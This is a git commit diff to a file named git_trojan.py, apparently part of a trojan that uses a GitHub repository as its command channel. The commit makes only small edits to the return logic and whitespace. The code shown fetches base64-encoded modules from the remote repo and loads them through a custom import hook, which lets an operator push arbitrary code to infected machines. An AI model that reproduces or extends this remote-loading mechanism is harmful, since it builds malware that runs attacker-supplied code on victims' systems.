de593932c6749a3029c439db415d5ad038d25b01
chunkylover7 <chuckscott@rocketmail.com>
2015-02-02 09:46:12 -0500

    changed config to run environ first

--- git_trojan.py
+++ git_trojan.py
@@ -36,9 +36,8 @@ def get_file_contents(filepath):
         if filepath in filename.path:
             print "[*] Found file %s" % filepath
             blob = repo.blob(filename._json_data['sha'])
-            return blob.content
 
-    return None
+    return blob.content
 
 def get_trojan_config():
     global configured
@@ -75,18 +74,21 @@ def module_runner(module):
 
 class GitImporter(object):
     def __init__(self):
+
         self.current_module_code = ""
 
     def find_module(self,fullname,path=None):
+
         if configured:
             print "[*] Attempting to retrieve %s" % fullname
             new_library = get_file_contents("modules/%s" % fullname)
 
             if new_library is not None:
                 self.current_module_code = base64.b64decode(new_library)
+
                 return self
 
-        return None
+        return None 
 
     def load_module(self,name):
 
